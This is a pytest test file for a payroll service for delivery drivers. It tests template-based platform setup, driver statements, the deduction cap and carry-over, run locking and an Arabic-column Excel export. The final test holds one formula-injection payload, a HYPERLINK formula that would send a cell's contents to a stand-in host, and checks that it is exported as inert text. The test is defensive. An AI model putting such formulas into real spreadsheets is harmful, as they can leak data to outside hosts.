"""Payroll (BRD 5.14): platforms set up from the client's salary templates, the driver's monthly statement (screenshots
and valid days), the monthly run with the cap and what moves on, approval and locking, the Excel in the client's
columns, the driver's payslip."""

import io
from decimal import Decimal

import openpyxl
import pytest

from app.core.clock import today
from app.modules.payroll import runs
from app.modules.payroll.service import add_months
from tests.conftest import bearer, bind_device, fund_treasury, jpeg, login, make_driver, make_employee, make_user

P = "/api/v1/payroll"
MONTH = today().replace(day=1)
IBAN = "KW81CBKU0000000000001234560101"
DAYS_HEADERS = [
    "driver id",
    "اسم السائق",
    "المهنه",
    "الرقم المدني",
    "رقم الايبان",
    "نوع البنك",
    "طريقه الدفع",
    "اجمالي الساعات",
    "اجمالي الطلبات",
    "عدد أيام الدوام",
    "عدد الأيام الصالحة",
    "البونص",
    "البقشيش",
    "خصم الأيام الغير صالحة",
    "خصم تصليح السيارة",
    "خصم مخالفات المرور",
    "خصومات الطلبات الملغاه",
    "خصم شريحة الهاتف",
    "خصم السلفه",
    "صافي الراتب",
]
ORDERS_HEADERS = [
    "driver id",
    "اسم السائق",
    "المهنه",
    "الرقم المدني",
    "رقم الايبان",
    "نوع البنك",
    "طريقه الدفع",
    "اجمالي الساعات",
    "اجمالي الطلبات",
    "خصم تصليح السيارة",
    "خصم مخالفات المرور",
    "خصومات من المنصة ب",
    "خصم شريحة الهاتف",
    "خصم السلفه",
    "خصم الكاش",
    "خصم التاخير",
    "صافي الراتب",
]


def template() -> bytes:
    wb = openpyxl.Workbook()
    wb.active.title = "نموذج رواتب المنصة أ"
    wb.active.append(DAYS_HEADERS)
    wb.create_sheet("نموذج رواتب المنصة ب").append(ORDERS_HEADERS)
    buf = io.BytesIO()
    wb.save(buf)
    return buf.getvalue()


def set_cap(client, percent="50.00", base="gross"):
    version = client.get("/api/v1/settings").json()["payroll"]["version"]
    r = client.put(
        "/api/v1/settings/payroll",
        json={"version": version, "value": {"max_deduction_percent": percent, "deduction_cap_base": base}},
    )
    assert r.status_code == 200, r.text


@pytest.fixture
def platforms(admin_client):
    r = admin_client.post(f"{P}/platforms/template", files={"file": ("t.xlsx", template(), "x")})
    assert r.status_code == 200, r.text
    days_sheet, orders_sheet = r.json()
    days = admin_client.post(
        f"{P}/platforms",
        json={
            "code": "by_days",
            "name": {"ar": days_sheet["suggested_name"], "en": "Platform A"},
            "driver_fields": days_sheet["driver_fields"],
            "invalid_days": days_sheet["invalid_days"],
            "day_divisor": 30,
            "columns": [{"code": c["code"], "header": c["header"]} for c in days_sheet["columns"]],
        },
    )
    orders = admin_client.post(
        f"{P}/platforms",
        json={
            "code": "by_orders",
            "name": {"ar": orders_sheet["suggested_name"], "en": "Platform B"},
            "per_order": "0.250",
            "columns": [{"code": c["code"], "header": c["header"]} for c in orders_sheet["columns"]],
        },
    )
    assert days.status_code == orders.status_code == 201, (days.text, orders.text)
    return {"days": days.json(), "orders": orders.json()}


@pytest.fixture
def staff(admin_client, company, platforms):
    days, orders = platforms["days"]["id"], platforms["orders"]["id"]
    a = make_driver(
        admin_client,
        company["id"],
        basic_salary="300.000",
        iban=IBAN,
        bank_name="الوطني",
        payment_method="bank",
        platform_id=days,
        platform_driver_id="K-1",
        civil_id="286092015272",
        job_title="سائق / سيارة خصوصي",
    )
    b = make_driver(
        admin_client,
        company["id"],
        basic_salary="250.000",
        payment_method="cash",
        platform_id=orders,
        platform_driver_id="T-9",
    )
    c = make_employee(admin_client, company["id"], basic_salary="500.000")
    d = make_driver(admin_client, company["id"], basic_salary="300.000", iban=IBAN, platform_id=days)
    return {"a": a, "b": b, "c": c, "d": d}


def shot(client, h) -> str:
    r = client.post(
        "/api/v1/driver/files", params={"source": "upload"}, headers=h, files={"file": ("s.jpg", jpeg(), "image/jpeg")}
    )
    assert r.status_code == 201, r.text
    return r.json()["sha256"]


def test_platforms_are_set_up_from_the_clients_template(admin_client, platforms, company):
    days, orders = platforms["days"], platforms["orders"]
    assert days["name"]["ar"] == "المنصة أ" and days["driver_fields"] == ["valid_days"]
    assert days["invalid_days"] == "daily_wage" and orders["invalid_days"] == "none"
    assert [c["header"] for c in days["columns"]] == DAYS_HEADERS
    codes = {c["header"]: c["code"] for c in orders["columns"]}
    assert codes["خصومات من المنصة ب"] == "platform_deductions" and codes["خصم الكاش"] == "cash_shortage"
    assert "blank" not in codes.values()

    bad = {"code": "x_y", "name": {"ar": "س", "en": "X"}, "columns": [{"code": "salary_tax", "header": "ض"}]}
    assert admin_client.post(f"{P}/platforms", json=bad).json()["code"] == "unknown_column"
    dup = {"code": "by_days", "name": {"ar": "س", "en": "X"}}
    assert admin_client.post(f"{P}/platforms", json=dup).json()["code"] == "platform_code_taken"
    r = admin_client.patch(f"{P}/platforms/{orders['id']}", json={"version": 1, "invalid_days": "fixed"})
    assert r.status_code == 422 and r.json()["code"] == "field_required"

    make_driver(admin_client, company["id"], platform_id=days["id"], platform_driver_id="K-77")
    r = admin_client.post(
        "/api/v1/employees",
        json={
            "employee_number": "X1",
            "name": {"ar": "س", "en": "S"},
            "company_id": company["id"],
            "platform_id": days["id"],
            "platform_driver_id": "k-77",
        },
    )
    assert r.status_code == 409 and r.json()["code"] == "platform_driver_id_taken"  # case does not matter
    r = admin_client.post(
        "/api/v1/employees",
        json={
            "employee_number": "X2",
            "name": {"ar": "س", "en": "S"},
            "company_id": company["id"],
            "platform_driver_id": "K-78",
        },
    )
    assert r.status_code == 422 and r.json()["code"] == "platform_required"
    found = admin_client.get("/api/v1/employees", params={"platform_id": days["id"]}).json()
    assert [e["platform_driver_id"] for e in found] == ["K-77"]
    assert {p["code"]: p["drivers"] for p in admin_client.get(f"{P}/platforms").json()}["by_days"] == 1


def test_the_driver_sends_the_month_and_the_office_reviews_it(admin_client, client, new_client, staff):
    h = bearer(bind_device(client, staff["a"]["phone"]))
    view = client.get("/api/v1/driver/statements", headers=h).json()
    assert view["platform"]["code"] == "by_days" and view["driver_fields"] == ["valid_days"]
    assert view["months"] == [add_months(MONTH, -1).isoformat(), MONTH.isoformat()] and view["statements"] == []

    s1 = shot(client, h)
    body = {"month": MONTH.isoformat(), "screenshots": [s1]}
    r = client.post("/api/v1/driver/statements", headers=h, json=body)
    assert r.status_code == 422 and r.json()["params"]["field"] == "valid_days"
    old = {"month": add_months(MONTH, -2).isoformat(), "screenshots": [s1], "valid_days": 20}
    assert client.post("/api/v1/driver/statements", headers=h, json=old).json()["code"] == "statement_month_invalid"
    other = new_client()
    h2 = bearer(bind_device(other, staff["d"]["phone"]))
    foreign = shot(other, h2)
    r = client.post("/api/v1/driver/statements", headers=h, json=body | {"screenshots": [foreign], "valid_days": 22})
    assert r.json()["code"] == "file_not_yours"
    r = client.post("/api/v1/driver/statements", headers=h, json=body | {"valid_days": 24, "orders": 410})
    assert r.status_code == 201 and r.json()["statements"][0]["status"] == "submitted", r.text
    assert client.post("/api/v1/driver/statements", headers=h, json=body | {"valid_days": 24}).json()["code"] == (
        "statement_exists"
    )

    listed = admin_client.get(f"{P}/statements", params={"month": MONTH.isoformat()}).json()
    assert len(listed) == 1 and listed[0]["status"] == "submitted" and listed[0]["from_driver"]
    sid = listed[0]["id"]
    detail = admin_client.get(f"{P}/statements/{sid}").json()
    assert detail["declared"] == {"valid_days": 24, "orders": 410} and detail["screenshots"] == [s1]
    assert detail["system"] == {  # none sent, nothing marked
        "working_days": 0,
        "orders": 0,
        "valid_days": 0,
        "pending_reports": 0,
        "absence_days": 0,
        "unpaid_leave_days": 0,
        "leave_days": 0,
        "unclassified_days": 0,
    }
    assert admin_client.get(f"{P}/statements/{sid}/files/{s1}").status_code == 200
    assert admin_client.get(f"{P}/statements/{sid}/files/{foreign}").status_code == 404
    assert admin_client.get(f"{P}/statements/counts").json() == {"submitted": 1}

    # the reviewer corrects what the screenshot really shows, and adds the settlement's amounts
    figures = {
        "working_days": 26,
        "valid_days": 22,
        "orders": 410,
        "bonus": "15.000",
        "tips": "5.000",
        "cancelled_orders": "10.000",
    }
    r = admin_client.post(f"{P}/statements/{sid}/approve", json=figures)
    assert r.status_code == 200 and r.json()["status"] == "approved" and r.json()["valid_days"] == 22, r.text
    assert r.json()["declared"]["valid_days"] == 24  # what the driver sent stays on record
    assert admin_client.post(f"{P}/statements/{sid}/reject", json={"reason": "wrong"}).json()["code"] == (
        "statement_not_submitted"
    )

    # a statement rejected goes back to the driver, who sends it again
    s2 = shot(other, h2)
    client2_body = {"month": MONTH.isoformat(), "screenshots": [s2], "valid_days": 30}
    assert other.post("/api/v1/driver/statements", headers=h2, json=client2_body).status_code == 201
    sid2 = next(s["id"] for s in admin_client.get(f"{P}/statements", params={"status": "submitted"}).json())
    r = admin_client.post(f"{P}/statements/{sid2}/reject", json={"reason": "the screenshot is of another month"})
    assert r.json()["status"] == "rejected"
    mine = other.get("/api/v1/driver/statements", headers=h2).json()["statements"]
    assert mine[0]["review_note"] == "the screenshot is of another month"
    assert (
        other.post("/api/v1/driver/statements", headers=h2, json=client2_body | {"valid_days": 21}).status_code == 201
    )

    make_user(admin_client, "viewer", permissions=["payroll.view"])
    v = new_client()
    login(v, "viewer")
    assert v.get(f"{P}/statements").status_code == 200
    assert v.post(f"{P}/statements/{sid}/approve", json=figures).status_code == 403


def test_the_run_caps_deductions_moves_the_rest_on_and_locks_the_month(
    admin_client, client, new_client, staff, company, platforms, db
):
    a, b, c, d = staff["a"], staff["b"], staff["c"], staff["d"]
    e = make_driver(admin_client, company["id"], basic_salary="300.000", iban=IBAN, platform_id=platforms["days"]["id"])
    other = new_client()
    he = bearer(bind_device(other, e["phone"]))
    sent = {"month": MONTH.isoformat(), "screenshots": [shot(other, he)], "valid_days": 5}
    assert other.post("/api/v1/driver/statements", headers=he, json=sent).status_code == 201
    run_body = {"company_id": company["id"], "month": MONTH.isoformat()}
    assert admin_client.post(f"{P}/runs", json=run_body).json()["code"] == "payroll_cap_not_set"
    set_cap(admin_client, "50.00", "gross")

    # driver A: his month as the platform reports it, an accident charged over two months and an advance
    h = bearer(bind_device(client, a["phone"]))
    client.post(
        "/api/v1/driver/statements",
        headers=h,
        json={"month": MONTH.isoformat(), "screenshots": [shot(client, h)], "valid_days": 22},
    )
    sid = admin_client.get(f"{P}/statements").json()[0]["id"]
    admin_client.post(
        f"{P}/statements/{sid}/approve",
        json={"working_days": 26, "valid_days": 22, "bonus": "15.000", "tips": "5.000", "cancelled_orders": "10.000"},
    )
    fund_treasury(db)  # the advance is paid out of the treasury
    for source, total, inst in (("other", "300.000", 2), ("advance", "20.000", 1)):
        r = admin_client.post(
            "/api/v1/deductions",
            json={
                "employee_id": a["id"],
                "source_type": source,
                "reason": f"{source} test",
                "total": total,
                "installments": inst,
                "start_month": MONTH.isoformat(),
            },
        )
        assert r.status_code == 201, r.text

    r = admin_client.post(f"{P}/runs", json=run_body)
    assert r.status_code == 201, r.text
    run = r.json()
    lines = {line["employee"]["id"]: line for line in run["lines"]}
    la = lines[a["id"]]
    # earnings 300 + 15 + 5 = 320; 4 days not counted x (300 / 30) = 40; earned 280; cancelled orders 10
    # cap: 50% of 280 = 140, all of it to the oldest deduction (150 due): 10 of it and the advance move on
    assert la["cells"]["invalid_days_deduction"] == "40.000" and la["cells"]["cancelled_orders"] == "10.000"
    assert la["cells"]["other_deductions"] == "140.000" and la["cells"]["advance"] == "0.000"
    assert la["cells"]["carried"] == "30.000" and la["cells"]["working_days"] == 26
    assert (la["gross"], la["deductions"], la["net"]) == ("320.000", "190.000", "130.000")
    assert la["flags"] == ["carried"]
    lb = lines[b["id"]]  # paid per order (none reported) plus his basic salary; paid in cash: no IBAN needed
    assert (lb["gross"], lb["net"], lb["flags"]) == ("250.000", "250.000", [])
    lc = lines[c["id"]]  # office staff: the basic salary, no platform
    assert (lc["net"], lc["flags"], lc["platform_id"]) == ("500.000", ["no_iban"], None)
    assert lines[d["id"]]["flags"] == ["statement_missing"]
    le = lines[e["id"]]  # sent but not reviewed: its figures are not used, and it blocks the approval
    assert le["flags"] == ["statement_pending"] and le["cells"]["valid_days"] is None and le["net"] == "300.000"
    assert run["blocking"] == 2 and run["status"] == "draft"
    # a draft takes nothing yet: next month still asks for both installments of the accident
    pending = runs.dues_for(db, [_id(db, a)], add_months(MONTH, 1))[_id(db, a)]
    assert {x.deduction.source_type: x.due for x in pending} == {
        "other": Decimal("300.000"),
        "advance": Decimal("20.000"),
    }

    r = admin_client.post(f"{P}/runs/{run['id']}/approve")
    assert r.status_code == 409 and r.json()["code"] == "run_has_blocking" and r.json()["params"]["count"] == 2
    se = next(x["id"] for x in admin_client.get(f"{P}/statements", params={"status": "submitted"}).json())
    admin_client.post(f"{P}/statements/{se}/approve", json={"working_days": 20, "valid_days": 20})
    # the office enters D's month from the platform's report: approval recomputes and goes through
    r = admin_client.post(
        f"{P}/statements",
        json={"employee_id": d["id"], "month": MONTH.isoformat(), "working_days": 20, "valid_days": 20},
    )
    assert r.status_code == 201 and r.json()["status"] == "approved", r.text
    r = admin_client.post(f"{P}/runs/{run['id']}/approve")
    assert r.status_code == 200 and r.json()["status"] == "approved", r.text
    assert r.json()["totals"]["net"] == "1480.000"  # 130 + 250 + 500 + 300 + 300

    # the month is locked: statements do not change, and the next month asks for what moved on
    locked = admin_client.post(f"{P}/statements/{sid}/approve", json={"valid_days": 26})
    assert locked.status_code == 409 and locked.json()["code"] == "payroll_locked"
    assert client.get("/api/v1/driver/statements", headers=h).json()["months"] == [add_months(MONTH, -1).isoformat()]
    due = {x.deduction.source_type: x.due for x in runs.dues_for(db, [_id(db, a)], add_months(MONTH, 1))[_id(db, a)]}
    assert due == {"other": Decimal("160.000"), "advance": Decimal("20.000")}  # next installment 150 + 10 carried

    # the driver's payslip, in his platform's order, without his identity columns
    slip = client.get("/api/v1/driver/payslips", headers=h).json()
    assert len(slip) == 1 and slip[0]["net"] == "130.000" and slip[0]["status"] == "approved"
    headers = [row["header"] for row in slip[0]["rows"]]
    assert headers[0] == "اجمالي الساعات" and "الرقم المدني" not in headers and headers[-1] == "صافي الراتب"

    # reopened (with a reason, unlock permission), then approved and paid
    assert (
        admin_client.post(f"{P}/runs/{run['id']}/reopen", json={"reason": "a late bonus"}).json()["status"] == "draft"
    )
    assert client.get("/api/v1/driver/payslips", headers=h).json() == []
    admin_client.post(f"{P}/runs/{run['id']}/approve")
    r = admin_client.post(f"{P}/runs/{run['id']}/paid", json={"payment_ref": "BANK-778"})
    assert r.json()["status"] == "paid" and r.json()["reopened"] == 1
    assert admin_client.post(f"{P}/runs/{run['id']}/reopen", json={"reason": "x" * 5}).json()["code"] == (
        "run_not_approved"
    )
    assert admin_client.post(f"{P}/runs", json=run_body).json()["code"] == "run_exists"


def _id(db, employee: dict) -> int:
    from sqlalchemy import text

    return db.execute(text("SELECT id FROM people.employees WHERE public_id = :p"), {"p": employee["id"]}).scalar()


def test_the_excel_is_the_clients_sheets(admin_client, client, staff, company):
    set_cap(admin_client)
    admin_client.post(
        f"{P}/statements",
        json={
            "employee_id": staff["a"]["id"],
            "month": MONTH.isoformat(),
            "working_days": 26,
            "valid_days": 26,
            "bonus": "12.500",
        },
    )
    admin_client.post(
        f"{P}/statements",
        json={"employee_id": staff["d"]["id"], "month": MONTH.isoformat(), "working_days": 20, "valid_days": 18},
    )
    run = admin_client.post(f"{P}/runs", json={"company_id": company["id"], "month": MONTH.isoformat()}).json()
    r = admin_client.get(f"{P}/runs/{run['id']}/export")
    assert r.status_code == 200 and "-draft.xlsx" in r.headers["content-disposition"]
    wb = openpyxl.load_workbook(io.BytesIO(r.content))
    assert wb.sheetnames == ["المنصة أ", "المنصة ب", "بدون منصة"]
    ws = wb["المنصة أ"]
    assert ws.sheet_view.rightToLeft and [c.value for c in ws[1]] == DAYS_HEADERS
    rows = {row[0].value: [c.value for c in row] for row in ws.iter_rows(min_row=2)}
    a = rows["K-1"]
    assert a[1] == staff["a"]["name"]["ar"] and a[3] == "286092015272" and a[4] == IBAN
    assert (a[6], a[9], a[10], float(a[11])) == ("تحويل بنكي", 26, 26, 12.5)
    assert float(a[-1]) == 312.5
    assert ws.cell(row=2, column=4).number_format == "@"
    assert [c.value for c in wb["المنصة ب"][1]] == ORDERS_HEADERS
    assert "صافي الراتب" in [c.value for c in wb["بدون منصة"][1]]
    admin_client.post(f"{P}/runs/{run['id']}/approve")
    named = admin_client.get(f"{P}/runs/{run['id']}/export").headers["content-disposition"]
    assert "-draft" not in named and MONTH.strftime("%Y-%m") in named


def test_runs_are_approved_and_reopened_in_order(admin_client, company):
    set_cap(admin_client)
    make_employee(admin_client, company["id"], basic_salary="400.000")
    earlier = add_months(MONTH, -1).isoformat()
    first = admin_client.post(f"{P}/runs", json={"company_id": company["id"], "month": earlier}).json()
    later = admin_client.post(f"{P}/runs", json={"company_id": company["id"], "month": MONTH.isoformat()}).json()
    r = admin_client.post(f"{P}/runs/{later['id']}/approve")
    assert r.status_code == 409 and r.json()["code"] == "earlier_run_draft"
    assert admin_client.post(f"{P}/runs/{first['id']}/approve").status_code == 200
    assert admin_client.post(f"{P}/runs/{later['id']}/approve").status_code == 200
    r = admin_client.post(f"{P}/runs/{first['id']}/reopen", json={"reason": "correction"})
    assert r.status_code == 409 and r.json()["code"] == "later_run_approved"
    future = add_months(MONTH, 1).isoformat()
    assert admin_client.post(f"{P}/runs", json={"company_id": company["id"], "month": future}).json()["code"] == (
        "run_month_in_future"
    )


def test_payroll_permissions(admin_client, new_client, company):
    set_cap(admin_client)
    make_user(admin_client, "prep", permissions=["payroll.view", "payroll.prepare"])
    c = new_client()
    login(c, "prep")
    run = c.post(f"{P}/runs", json={"company_id": company["id"], "month": MONTH.isoformat()})
    assert run.status_code == 201, run.text
    rid = run.json()["id"]
    assert c.post(f"{P}/runs/{rid}/approve").status_code == 403
    assert c.get(f"{P}/runs/{rid}/export").status_code == 403
    assert c.post(f"{P}/platforms", json={"code": "zz", "name": {"ar": "س", "en": "Z"}}).status_code == 403
    assert (
        c.post(
            "/api/v1/deductions",
            json={
                "employee_id": "00000000-0000-0000-0000-000000000000",
                "source_type": "sim",
                "reason": "SIM card",
                "total": "5.000",
            },
        ).status_code
        == 403
    )


# ------------------------------------------------------------------ the line computation itself


class _P:
    def __init__(self, **kw):
        self.pay_basic, self.per_order, self.per_hour, self.per_valid_day = True, Decimal(0), Decimal(0), Decimal(0)
        self.invalid_days, self.invalid_day_amount, self.day_divisor, self.driver_fields = "none", None, 30, []
        self.daily_fields = ["orders", "cash"]
        self.__dict__.update(kw)


class _S:
    status = "approved"

    def __init__(self, **kw):
        self.working_days = self.valid_days = self.orders = self.hours = None
        self.batch_level = self.attendance_marks = self.star_day_failed = None
        for k in ("bonus", "tips", "cancelled_orders", "platform_deductions", "late", "cash_shortage"):
            setattr(self, k, Decimal(0))
        self.__dict__.update(kw)


def _profile(**kw):
    base = {
        "basic_salary": Decimal("300"),
        "payment_method": "bank",
        "iban": IBAN,
        "is_driver": True,
        "name": {"ar": "س"},
        "platform_driver_id": None,
        "job_title": None,
        "civil_id": None,
        "bank_name": None,
    }
    return base | kw


def _compute(platform, statement, *, system=None, profile=None, dues=(), percent="50", base="gross"):
    return runs.compute(
        _profile(**(profile or {})),
        platform,
        statement,
        system or {"working_days": 0, "orders": 0},
        list(dues),
        cap_percent=Decimal(percent),
        cap_base=base,
        name_lang="ar",
    )


def test_rates_fixed_day_rate_and_the_basic_cap():
    p = _P(
        pay_basic=False,
        per_order=Decimal("0.300"),
        per_hour=Decimal("0.500"),
        invalid_days="fixed",
        invalid_day_amount=Decimal("4.000"),
        driver_fields=["valid_days"],
    )
    c = _compute(p, _S(orders=1000, hours=Decimal("200.5"), working_days=25, valid_days=23))
    assert c.gross == Decimal("400.250") and c.cells["invalid_days_deduction"] == Decimal("8.000")
    assert c.net == Decimal("392.250") and "no_basic_salary" not in c.flags  # no basic: not paid one either

    # a month counted on 26 working days; more valid days than days worked never pays extra or goes negative
    c = _compute(_P(invalid_days="daily_wage", day_divisor=26), _S(working_days=26, valid_days=21))
    assert c.cells["invalid_days_deduction"] == Decimal("57.690")  # 5 x 11.538
    c = _compute(_P(invalid_days="daily_wage"), _S(working_days=20, valid_days=22))
    assert c.cells["invalid_days_deduction"] == Decimal("0") and c.net == Decimal("300.000")

    # days worked from the system when the statement leaves them out
    c = _compute(_P(invalid_days="daily_wage"), _S(valid_days=20), system={"working_days": 23, "orders": 7})
    assert (
        c.cells["working_days"] == 23
        and c.cells["orders"] == 7
        and c.cells["invalid_days_deduction"] == Decimal("30.000")
    )

    # the cap on the basic salary: 10% of 300 whatever was earned
    from datetime import date as d_

    class _D:
        def __init__(self, i, src):
            self.id, self.start_month, self.source_type = i, d_(2026, 1, 1), src

    dues = [runs.Due(_D(1, "accident"), Decimal("100")), runs.Due(_D(2, "fine"), Decimal("50"))]
    c = _compute(_P(), _S(bonus=Decimal("200")), dues=dues, percent="10", base="basic")
    assert c.cells["car_repair"] == Decimal("30.000") and c.cells["traffic_fines"] == Decimal("0")
    assert c.cells["carried"] == Decimal("120") and c.net == Decimal("470.000")


def test_the_net_is_never_negative():
    # decision D: 350 of platform deductions on a 300 month: the net stops at zero, 50 uncollected for review, and
    # the line still goes through the approval
    c = _compute(_P(), _S(platform_deductions=Decimal("350")))
    assert (c.gross, c.deductions, c.net) == (Decimal("300.000"), Decimal("300.000"), Decimal("0.000"))
    assert c.cells["platform_deductions"] == Decimal("350.000") and c.cells["uncovered_penalty"] == Decimal("50.000")
    assert c.flags == ["uncollected"] and not set(c.flags) & set(runs.BLOCKING)
    from datetime import date as d_

    class _D:
        id, start_month, source_type = 1, d_(2026, 1, 1), "advance"

    c = _compute(_P(), _S(late=Decimal("290")), dues=[runs.Due(_D(), Decimal("100"))])
    assert c.cells["advance"] == Decimal("10.000") and c.net == Decimal("0.000")  # only what was left
    assert c.cells["carried"] == Decimal("90.000") and c.cells["uncovered_penalty"] == Decimal("0.000")


def test_a_name_that_looks_like_a_formula_stays_text_in_the_bank_file(admin_client, company, platforms):
    """The bank's file must not run anything a name or a note carries (Excel formula injection)."""
    set_cap(admin_client)
    evil = '=HYPERLINK("http://x.example/?"&A1,"open")'
    make_employee(admin_client, company["id"], basic_salary="400.000", name={"ar": evil, "en": evil})
    run = admin_client.post(f"{P}/runs", json={"company_id": company["id"], "month": MONTH.isoformat()}).json()
    wb = openpyxl.load_workbook(io.BytesIO(admin_client.get(f"{P}/runs/{run['id']}/export").content))
    cells = [c for ws in wb for row in ws.iter_rows(min_row=2) for c in row if c.value == evil]
    assert cells and all(c.data_type == "s" for c in cells)
